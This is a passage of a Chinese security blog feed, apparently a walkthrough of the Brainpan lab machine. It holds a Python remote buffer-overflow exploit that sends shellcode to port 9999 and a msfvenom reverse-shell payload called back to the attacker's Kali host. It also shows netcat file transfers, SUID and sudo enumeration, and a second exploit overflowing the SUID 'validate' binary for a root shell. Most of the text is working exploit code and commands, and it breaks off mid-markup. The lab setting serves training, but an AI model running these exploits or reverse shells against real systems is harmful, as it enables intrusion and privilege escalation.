class="hljs-symbol">\x</span>ae<span class="hljs-symbol">\x</span>17<span class="hljs-symbol">\x</span>8e<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>c1<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>0d<span class="hljs-symbol">\x</span>ca<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>22<span class="hljs-symbol">\x</span>e2<span class="hljs-symbol">\x</span>84<span class="hljs-symbol">\x</span>2b&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>b2<span class="hljs-symbol">\x</span>c8<span class="hljs-symbol">\x</span>16<span class="hljs-symbol">\x</span>2d<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>e1<span class="hljs-symbol">\x</span>d1<span class="hljs-symbol">\x</span>0a<span class="hljs-symbol">\x</span>f1<span class="hljs-symbol">\x</span>b4<span class="hljs-symbol">\x</span>ee<span class="hljs-symbol">\x</span>a3<span class="hljs-symbol">\x</span>95<span class="hljs-symbol">\x</span>30&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>97<span class="hljs-symbol">\x</span>d9<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>be<span class="hljs-symbol">\x</span>42<span class="hljs-symbol">\x</span>5a<span class="hljs-symbol">\x</span>35<span class="hljs-symbol">\x</span>f5<span class="hljs-symbol">\x</span>ce<span class="hljs-symbol">\x</span>cb<span class="hljs-symbol">\x</span>de<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>9b<span class="hljs-symbol">\x</span>49<span class="hljs-symbol">\x</span>83&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>76<span class="hljs-symbol">\x</span>8d<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>e0<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>6e<span class="hljs-symbol">\x</span>39<span class="hljs-symbol">\x</span>f8<span class="hljs-symbol">\x</span>f7<span class="hljs-symbol">\x</span>6b<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>be<span class="hljs-symbol">\x</span>e4<span class="hljs-symbol">\x</span>01&quot;<br>shellcode +=&quot;<span class="hljs-symbol">\x</span>16<span class="hljs-symbol">\x</span>2b<span class="hljs-symbol">\x</span>0a<span class="hljs-symbol">\x</span>b5<span class="hljs-symbol">\x</span>17<span class="hljs-symbol">\x</span>7e&quot;<br><br>buffersize = 524<br><br>eip = pack(&#x27;&lt;L&#x27;, 0x311712f3)<br>buffer = &quot;<span class="hljs-symbol">\x</span>41&quot;*buffersize + eip + &quot;<span class="hljs-symbol">\x</span>90&quot; *16+shellcode <br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>print &quot;[*]Sending evil buffer...&quot;<br>print len(shellcode)<br>s.connect((host, 9999))<br>data=s.recv(1024)<br>print data<br>s.send(buffer)<br>s.close()<br>print &quot;[*]Payload Sent !&quot;<br><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-04/10.PNG" alt="10"></p><p>执行后成功反弹shell。原理就不解释了，看以前的文章。</p><h2 id="d6-py"><a href="#d6-py" class="headerlink" title="d6.py"></a>d6.py</h2><p>在本地windows运行成功后，把shellcode改为linux的</p><p>msfvenom -l payload | grep linux</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">LHOST</span>是kali的IP<br><span class="hljs-attribute">LHOST</span>是kali的监听端口<br><span class="hljs-attribute">msfvenom</span> -p linux/x<span class="hljs-number">86</span>/shell_reverse_tcp LHOST=<span class="hljs-number">192.168.67.128</span> LPORT=<span class="hljs-number">443</span> -b <span class="hljs-string">&quot;\x00&quot;</span> -e x<span class="hljs-number">86</span>/shikata_ga_nai -f c<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-04/11.PNG" alt="11"><br>成功进行栈溢出。</p><h2 id="wine"><a href="#wine" class="headerlink" title="wine"></a>wine</h2><p>cat /home/puck/*.sh</p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">if</span> [[ $? -eq <span class="hljs-number">1</span> ]]; then <br>pid=`ps aux | <span class="hljs-keyword">grep</span> brainpan.exe | <span class="hljs-keyword">grep</span> -v <span class="hljs-keyword">grep</span>`<br><span class="hljs-keyword">if</span> [[ ! -z $pid ]]; then<br>kill -<span class="hljs-number">9</span> $pid<br>killall wineserver<br>killall winedevice.exe<br>fi<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/wine /</span>home<span class="hljs-regexp">/puck/</span>web<span class="hljs-regexp">/bin/</span>brainpan.exe &amp;<br>fi <br><br>可以看到使用wine，在linux平台执行了exe程序<br></code></pre></div></td></tr></table></figure><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">python</span> <span class="hljs-string">-c</span> <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">find</span> <span class="hljs-string">/</span> <span class="hljs-string">-perm</span> <span class="hljs-number">-4000</span> <span class="hljs-number">2</span><span class="hljs-string">&gt;/dev/null</span><br><span class="hljs-string">查看有suid权限的程序</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">-l</span><br><span class="hljs-attr">Matching Defaults entries for puck on this host:</span><br>    <span class="hljs-string">env_reset,</span> <span class="hljs-string">mail_badpass,</span><br>    <span class="hljs-string">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><br><span class="hljs-attr">User puck may run the following commands on this host:</span><br>    <span class="hljs-string">(root)</span> <span class="hljs-attr">NOPASSWD:</span> <span class="hljs-string">/home/anansi/bin/anansi_util</span><br><br><span class="hljs-string">file</span> <span class="hljs-string">/home/anansi/bin/anansi_util</span><br><span class="hljs-string">无权限查看</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">sh</span> <span class="hljs-string">/home/anansi/bin/anansi_util</span><br><span class="hljs-attr">sh: 0:</span> <span class="hljs-string">Can&#x27;t</span> <span class="hljs-string">open</span> <span class="hljs-string">/home/anansi/bin/anansi_util</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">cd</span> <span class="hljs-string">/home/anansi</span><br><span class="hljs-string">无权限</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">cat</span> <span class="hljs-string">/etc/passwd</span> <span class="hljs-string">|</span> <span class="hljs-string">grep</span> <span class="hljs-string">home</span><br><br><span class="hljs-string">reynard:x:1000:1000:Reynard,,,:/home/reynard:/bin/bash</span><br><span class="hljs-string">anansi:x:1001:1001:Anansi,,,:/home/anansi:/bin/bash</span><br><span class="hljs-string">puck:x:1002:1002:Puck,,,:/home/puck:/bin/bash</span><br><span class="hljs-string">找到三个普通用户</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">file</span> <span class="hljs-string">/usr/local/bin/validate</span><br><span class="hljs-string">cd</span> <span class="hljs-string">/usr/local/bin;./validate</span><br><br><span class="hljs-string">结果</span><br><span class="hljs-string">validating</span> <span class="hljs-string">input...passed.</span><br></code></pre></div></td></tr></table></figure><p>无论输入什么，都显示上述一行，经过测试它有溢出错误。<br>详情看下一篇文章</p>]]></content>
    
    
    <categories>
      
      <category>buffer overflow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>buffer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>brainpan（suid溢出提权）</title>
    <link href="/2020/01/30/06-x/"/>
    <url>/2020/01/30/06-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：<a href="https://whale3070.github.io/training/2020/01/06/06-x/">Sneaky（suid+缓冲区溢出提权）</a></p><p><a href="https://whale3070.github.io/buffer%20overflow/2020/01/30/04-x/">上一篇</a><br>得到了一个普通权限的shell，通过suid的缓冲区溢出漏洞，得到shell。这也不是第一次遇到了类似情况了。</p><h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><p>whereis gdb<br>结果显示客户机没有gdb，所以传输到kali上分析。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">【目标机】nc -lnvp <span class="hljs-number">8080</span> -w <span class="hljs-number">5</span> &lt; <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>validate<br>【kali】nc <span class="hljs-number">192.168</span>.<span class="hljs-number">67.130</span> <span class="hljs-number">8080</span>  -w <span class="hljs-number">5</span> &gt; validate<br></code></pre></div></td></tr></table></figure><h2 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h2><p>chmod a+x validate</p><h3 id="让程序报错"><a href="#让程序报错" class="headerlink" title="让程序报错"></a>让程序报错</h3><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">gdb validate<br>run  <span class="hljs-constructor">$(<span class="hljs-params">python</span> -<span class="hljs-params">c</span> <span class="hljs-string">&quot;print &#x27;A&#x27;*500&quot;</span>)</span>  报错<br>run  <span class="hljs-constructor">$(<span class="hljs-params">python</span> -<span class="hljs-params">c</span> <span class="hljs-string">&quot;print &#x27;A&#x27;*250&quot;</span>)</span> 报错<br>run  <span class="hljs-constructor">$(<span class="hljs-params">python</span> -<span class="hljs-params">c</span> <span class="hljs-string">&quot;print &#x27;A&#x27;*100&quot;</span>)</span> 正常<br></code></pre></div></td></tr></table></figure><p>直到找到恰当的长度</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">run  <span class="hljs-constructor">$(<span class="hljs-params">python</span> -<span class="hljs-params">c</span> <span class="hljs-string">&quot;print &#x27;A&#x27;*150&quot;</span>)</span> 报错<br></code></pre></div></td></tr></table></figure><h3 id="找到缓冲区长度116"><a href="#找到缓冲区长度116" class="headerlink" title="找到缓冲区长度116"></a>找到缓冲区长度116</h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>tools<span class="hljs-regexp">/exploit/</span>pattern_create.rb -l <span class="hljs-number">150</span><br><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-06/3.PNG" alt="3"></p><p>0x39644138 </p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>tools<span class="hljs-regexp">/exploit/</span>pattern_offset.rb -l <span class="hljs-number">150</span> -q <span class="hljs-number">39644138</span><br><br>Exact match at offset <span class="hljs-number">116</span><br></code></pre></div></td></tr></table></figure><h3 id="检查坏字符"><a href="#检查坏字符" class="headerlink" title="检查坏字符"></a>检查坏字符</h3><p>遇到问题，不知道如何用gdb或者edb检查坏字符。思考后成功找到定位方法。</p><p><code>edb --run /root/Desktop/validate $(python badchar.py)</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-06/7.PNG" alt="7"><br>右下角堆栈面板，选中有很多A字符的地址，右键<code>follow address in dump</code>。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-06/9.PNG" alt="9"></p><p>A字符的末尾，可以看到<code>01、02、03...</code>输入的字符。可以看到08后面没有09，于是09是坏字符。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-06/8.PNG" alt="8"></p><p>以此类推，检查的坏字符有<code>\x09\x0a</code></p><h3 id="badchar-py"><a href="#badchar-py" class="headerlink" title="badchar.py"></a>badchar.py</h3><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">print &#x27;A&#x27;*116+&quot;<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\x</span>0d<span class="hljs-symbol">\x</span>0e<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>10<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>12<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>14<span class="hljs-symbol">\x</span>15<span class="hljs-symbol">\x</span>16<span class="hljs-symbol">\x</span>17<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>19<span class="hljs-symbol">\x</span>1a<span class="hljs-symbol">\x</span>1b<span class="hljs-symbol">\x</span>1c<span class="hljs-symbol">\x</span>1d<span class="hljs-symbol">\x</span>1e<span class="hljs-symbol">\x</span>1f<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>21<span class="hljs-symbol">\x</span>22<span class="hljs-symbol">\x</span>23<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>25<span class="hljs-symbol">\x</span>26<span class="hljs-symbol">\x</span>27<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>29<span class="hljs-symbol">\x</span>2a<span class="hljs-symbol">\x</span>2b<span class="hljs-symbol">\x</span>2c<span class="hljs-symbol">\x</span>2d<span class="hljs-symbol">\x</span>2e<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>30<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>32<span class="hljs-symbol">\x</span>33<span class="hljs-symbol">\x</span>34<span class="hljs-symbol">\x</span>35<span class="hljs-symbol">\x</span>36<span class="hljs-symbol">\x</span>37<span class="hljs-symbol">\x</span>38<span class="hljs-symbol">\x</span>39<span class="hljs-symbol">\x</span>3a<span class="hljs-symbol">\x</span>3b<span class="hljs-symbol">\x</span>3c<span class="hljs-symbol">\x</span>3d<span class="hljs-symbol">\x</span>3e<span class="hljs-symbol">\x</span>3f<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>42<span class="hljs-symbol">\x</span>43<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>45<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>49<span class="hljs-symbol">\x</span>4a<span class="hljs-symbol">\x</span>4b<span class="hljs-symbol">\x</span>4c<span class="hljs-symbol">\x</span>4d<span class="hljs-symbol">\x</span>4e<span class="hljs-symbol">\x</span>4f<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>54<span class="hljs-symbol">\x</span>55<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>57<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>5a<span class="hljs-symbol">\x</span>5b<span class="hljs-symbol">\x</span>5c<span class="hljs-symbol">\x</span>5d<span class="hljs-symbol">\x</span>5e<span class="hljs-symbol">\x</span>5f<span class="hljs-symbol">\x</span>60<span class="hljs-symbol">\x</span>61<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>63<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>65<span class="hljs-symbol">\x</span>66<span class="hljs-symbol">\x</span>67<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>69<span class="hljs-symbol">\x</span>6a<span class="hljs-symbol">\x</span>6b<span class="hljs-symbol">\x</span>6c<span class="hljs-symbol">\x</span>6d<span class="hljs-symbol">\x</span>6e<span class="hljs-symbol">\x</span>6f<span class="hljs-symbol">\x</span>70<span class="hljs-symbol">\x</span>71<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>76<span class="hljs-symbol">\x</span>77<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>79<span class="hljs-symbol">\x</span>7a<span class="hljs-symbol">\x</span>7b<span class="hljs-symbol">\x</span>7c<span class="hljs-symbol">\x</span>7d<span class="hljs-symbol">\x</span>7e<span class="hljs-symbol">\x</span>7f<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>81<span class="hljs-symbol">\x</span>82<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>84<span class="hljs-symbol">\x</span>85<span class="hljs-symbol">\x</span>86<span class="hljs-symbol">\x</span>87<span class="hljs-symbol">\x</span>88<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>8a<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>8c<span class="hljs-symbol">\x</span>8d<span class="hljs-symbol">\x</span>8e<span class="hljs-symbol">\x</span>8f<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>91<span class="hljs-symbol">\x</span>92<span class="hljs-symbol">\x</span>93<span class="hljs-symbol">\x</span>94<span class="hljs-symbol">\x</span>95<span class="hljs-symbol">\x</span>96<span class="hljs-symbol">\x</span>97<span class="hljs-symbol">\x</span>98<span class="hljs-symbol">\x</span>99<span class="hljs-symbol">\x</span>9a<span class="hljs-symbol">\x</span>9b<span class="hljs-symbol">\x</span>9c<span class="hljs-symbol">\x</span>9d<span class="hljs-symbol">\x</span>9e<span class="hljs-symbol">\x</span>9f<span class="hljs-symbol">\x</span>a0<span class="hljs-symbol">\x</span>a1<span class="hljs-symbol">\x</span>a2<span class="hljs-symbol">\x</span>a3<span class="hljs-symbol">\x</span>a4<span class="hljs-symbol">\x</span>a5<span class="hljs-symbol">\x</span>a6<span class="hljs-symbol">\x</span>a7<span class="hljs-symbol">\x</span>a8<span class="hljs-symbol">\x</span>a9<span class="hljs-symbol">\x</span>aa<span class="hljs-symbol">\x</span>ab<span class="hljs-symbol">\x</span>ac<span class="hljs-symbol">\x</span>ad<span class="hljs-symbol">\x</span>ae<span class="hljs-symbol">\x</span>af<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>b1<span class="hljs-symbol">\x</span>b2<span class="hljs-symbol">\x</span>b3<span class="hljs-symbol">\x</span>b4<span class="hljs-symbol">\x</span>b5<span class="hljs-symbol">\x</span>b6<span class="hljs-symbol">\x</span>b7<span class="hljs-symbol">\x</span>b8<span class="hljs-symbol">\x</span>b9<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>bc<span class="hljs-symbol">\x</span>bd<span class="hljs-symbol">\x</span>be<span class="hljs-symbol">\x</span>bf<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>c1<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>c4<span class="hljs-symbol">\x</span>c5<span class="hljs-symbol">\x</span>c6<span class="hljs-symbol">\x</span>c7<span class="hljs-symbol">\x</span>c8<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>ca<span class="hljs-symbol">\x</span>cb<span class="hljs-symbol">\x</span>cc<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>ce<span class="hljs-symbol">\x</span>cf<span class="hljs-symbol">\x</span>d0<span class="hljs-symbol">\x</span>d1<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>d3<span class="hljs-symbol">\x</span>d4<span class="hljs-symbol">\x</span>d5<span class="hljs-symbol">\x</span>d6<span class="hljs-symbol">\x</span>d7<span class="hljs-symbol">\x</span>d8<span class="hljs-symbol">\x</span>d9<span class="hljs-symbol">\x</span>da<span class="hljs-symbol">\x</span>db<span class="hljs-symbol">\x</span>dc<span class="hljs-symbol">\x</span>dd<span class="hljs-symbol">\x</span>de<span class="hljs-symbol">\x</span>df<span class="hljs-symbol">\x</span>e0<span class="hljs-symbol">\x</span>e1<span class="hljs-symbol">\x</span>e2<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>e4<span class="hljs-symbol">\x</span>e5<span class="hljs-symbol">\x</span>e6<span class="hljs-symbol">\x</span>e7<span class="hljs-symbol">\x</span>e8<span class="hljs-symbol">\x</span>e9<span class="hljs-symbol">\x</span>ea<span class="hljs-symbol">\x</span>eb<span class="hljs-symbol">\x</span>ec<span class="hljs-symbol">\x</span>ed<span class="hljs-symbol">\x</span>ee<span class="hljs-symbol">\x</span>ef<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>f1<span class="hljs-symbol">\x</span>f2<span class="hljs-symbol">\x</span>f3<span class="hljs-symbol">\x</span>f4<span class="hljs-symbol">\x</span>f5<span class="hljs-symbol">\x</span>f6<span class="hljs-symbol">\x</span>f7<span class="hljs-symbol">\x</span>f8<span class="hljs-symbol">\x</span>f9<span class="hljs-symbol">\x</span>fa<span class="hljs-symbol">\x</span>fb<span class="hljs-symbol">\x</span>fc<span class="hljs-symbol">\x</span>fd<span class="hljs-symbol">\x</span>fe<span class="hljs-symbol">\x</span>ff&quot;<br><br></code></pre></div></td></tr></table></figure><h3 id="msfelfscan"><a href="#msfelfscan" class="headerlink" title="msfelfscan"></a>msfelfscan</h3><p>如果msfelfscan提示命令未找到。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>bin<br>ln -s <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/framework2/m</span>sfelfscan msfelfscan<br></code></pre></div></td></tr></table></figure><p>再次输入<code>msfelfscan -h</code>，即可。</p><h3 id="找到EIP跳转的地址"><a href="#找到EIP跳转的地址" class="headerlink" title="找到EIP跳转的地址"></a>找到EIP跳转的地址</h3><p>本来想找到JMP ESP栈顶的地址，但是没有找到。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-06/4.PNG" alt="4"></p><h3 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h3><p><code>msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b &#39;\x00\x09\x0a&#39;</code></p><h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">from struct import pack<br><br>buf =  b&quot;&quot;<br>buf += b&quot;<span class="hljs-symbol">\x</span>b8<span class="hljs-symbol">\x</span>76<span class="hljs-symbol">\x</span>71<span class="hljs-symbol">\x</span>c5<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>db<span class="hljs-symbol">\x</span>c5<span class="hljs-symbol">\x</span>d9<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>f4<span class="hljs-symbol">\x</span>5d<span class="hljs-symbol">\x</span>29&quot;<br>buf += b&quot;<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>b1<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>c5<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>45<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>45<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>e2&quot;<br>buf += b&quot;<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>1b<span class="hljs-symbol">\x</span>ce<span class="hljs-symbol">\x</span>70<span class="hljs-symbol">\x</span>f2<span class="hljs-symbol">\x</span>8e<span class="hljs-symbol">\x</span>b6<span class="hljs-symbol">\x</span>e8<span class="hljs-symbol">\x</span>29<span class="hljs-symbol">\x</span>4c<span class="hljs-symbol">\x</span>be<span class="hljs-symbol">\x</span>0e<span class="hljs-symbol">\x</span>59&quot;<br>buf += b&quot;<span class="hljs-symbol">\x</span>bd<span class="hljs-symbol">\x</span>b3<span class="hljs-symbol">\x</span>b8<span class="hljs-symbol">\x</span>99<span class="hljs-symbol">\x</span>a9<span class="hljs-symbol">\x</span>1c<span class="hljs-symbol">\x</span>5b<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>ea<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>70&quot;<br>buf += b&quot;<span class="hljs-symbol">\x</span>e4<span class="hljs-symbol">\x</span>7e<span class="hljs-symbol">\x</span>54<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>da<span class="hljs-symbol">\x</span>1c<span class="hljs-symbol">\x</span>3d<span class="hljs-symbol">\x</span>ee<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>92<span class="hljs-symbol">\x</span>d5<span class="hljs-symbol">\x</span>ee<span class="hljs-symbol">\x</span>04&quot;<br>buf += b&quot;<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>ac<span class="hljs-symbol">\x</span>0e<span class="hljs-symbol">\x</span>67<span class="hljs-symbol">\x</span>27&quot;<br><br>buffersize = 116      <br><br>nop = &quot;<span class="hljs-symbol">\x</span>90&quot; * (buffersize - len(buf)) <br>eax = pack(&#x27;&lt;L&#x27;, 0x080484af)        <br>payload = buf + nop + eax <br><br>print payload<br><br></code></pre></div></td></tr></table></figure><h2 id="文件传输-1"><a href="#文件传输-1" class="headerlink" title="文件传输"></a>文件传输</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">【目标机】nc -lnvp <span class="hljs-number">8080</span> -w <span class="hljs-number">5</span> &gt; exp.py<br>【kali】nc <span class="hljs-number">192.168</span>.<span class="hljs-number">67.130</span> <span class="hljs-number">8080</span>  -w <span class="hljs-number">5</span> &lt; exp.py<br>cd  <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>;.<span class="hljs-regexp">/validate $(python /</span>tmp/exp.py)<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-06/5.PNG" alt="5"></p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">file</span> <span 